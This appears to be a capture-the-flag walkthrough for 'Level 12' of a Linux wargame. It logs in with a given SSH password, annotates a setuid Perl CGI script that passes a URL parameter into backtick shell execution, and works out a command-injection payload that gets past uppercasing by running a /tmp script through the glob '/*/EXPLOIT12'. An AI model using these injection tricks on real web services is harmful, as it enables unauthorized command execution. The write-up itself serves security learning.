# Level 12

## Requirements

- None

## Walkthrough

1. Login from the __attacker__'s machine.

	```
	ssh -p 4242 level12@192.168.1.32
	Password: fa6v5ateaw21peobuub8ipe6s
	```

1. Check files.

	```sh
	> ls -l
	total 4
	-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
	```

1. Another PERL script, at first sight, it's very similar to `level04`, let's analyze it.

	```perl
	#!/usr/bin/env perl
	# localhost:4646
	use CGI qw{param};
	print "Content-type: text/html\n\n";

	# Function `t`
	sub t {
		# Alias to second argument
		$nn = $_[1];
		# Alias to first argument
		$xx = $_[0];
		# Replace lowercase by uppercase
		$xx =~ tr/a-z/A-Z/;
		# Erase everything after a whitespace
		# The \s metacharacter matches whitespace character.
		# Whitespace characters can be:
		#  - A space character
		#  - A tab character
		#  - A carriage return character
		#  - A new line character
		#  - A vertical tab character
		#  - A form feed character
		$xx =~ s/\s.*//;
		# Execute a Shell command (egrep) using the formatted first argument as pattern
		# Warning: It is executed using backticks (`) and double-quote ("), so everything will be interpreted as Shell code, not only text!
		# We should be able to inject here
		@output = `egrep "^$xx" /tmp/xd 2>&1`;
		# Loop through `egrep` result, to split each line on ':', changing return value accordingly
		foreach $line (@output) {
			($f, $s) = split(/:/, $line);
			if($s =~ $nn) {
				return 1;
			}
		}
		return 0;
	}

	# Function `n`
	sub n {
		# Just print `..` or `.` depending on the first argument value
		if($_[0] == 1) {
			print("..");
		} else {
			print(".");
		}
	}

	# Call function `n`, with 2 arguments:
	# - t(param("x")) : Result of the call to function `t` with `param("x"), taken from request URL (ex: ..?x=qwe)
	# - param("y") : Taken from request URL (ex: ..?y=asd)
	n(t(param("x"), param("y")));
	```

1. 88 miles/hour Marty ! Let's reuse the same method as in `level04`.

	```sh
	> curl 'localhost:4646?x=$(getflag>/tmp/exploit11)'
	..

	> curl 'localhost:4646?x=$(getflag>/tmp/exploit11)&y=qwe'
	.

	> cat /tmp/exploit11
	cat: /tmp/exploit11: No such file or directory
	```

1. Nevermind, forgot we can't do that, everything is uppercased, so obviously it won't work. Let's try to find a way to reverse the uppercase.

	```sh
	> CMD="GETFLAG";FILE="/TMP/TEST12";${CMD,,}>${FILE,,}

	> cat ${FILE,,}
	Check flag.Here is your token :
	Nope there is no token here for you sorry. Try again :)
	```

1. I am a f*cking GENIUS! Let's inject this, MF!

	```sh
	# -g : We need to disable URL parser because `{` and `}` are not URL safe characters
	> curl -g 'localhost:4646?x=$(CMD="getflag";FILE="/tmp/exploit12";${CMD,,}>${FILE,,})'

	> cat /tmp/exploit12
	cat: /tmp/exploit12: No such file or directory
	```

1. Karma.. Too much confident.. Even if I "force" the use of curly brackets with `curl`, the `server` probably doesn't parse them correctly... We have to find another way.. Let's do a quick recap.

	```
	- Everything has to be uppercase
	- Can't use spaces
	- Limited to URL safe characters
	```

1. Since we can only use uppercase, we can't inject `getflag` directly into the URL, so I guess we need to make a script file first.

	```sh
	> FILE=/tmp/EXPLOIT12; echo -e '#!/usr/bin/env bash'"\n"'getflag > /tmp/flag12' > $FILE; chmod +x $FILE
	```

1. Now, we have to find a way to execute it. We know the path is `/tmp/EXPLOIT12`, so we need to just have to handle the `/tmp` part now. Let's read the bash documentation...

	```
	https://www.gnu.org/software/bash/manual/bash.html#Filename-Expansion

	*

    Matches any string, including the null string. When the globstar shell option is enabled, and ‘*’ is used in a filename expansion context, two adjacent ‘*’s used as a single pattern will match all files and zero or more directories and subdirectories. If followed by a ‘/’, two adjacent ‘*’s will match only directories and subdirectories.
	```

1. Great, I think we are getting closer. Let's try this.

	```sh
	> curl 'localhost:4646?x=$(/*/EXPLOIT12)'
	..
	```

1. Get the flag.

	```sh
	> cat /tmp/flag12
	Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
	```

## Documentation

- Command: [egrep](https://linux.die.net/man/1/egrep)
- Terminal: [Bash](https://www.gnu.org/software/bash/manual/bash.html)
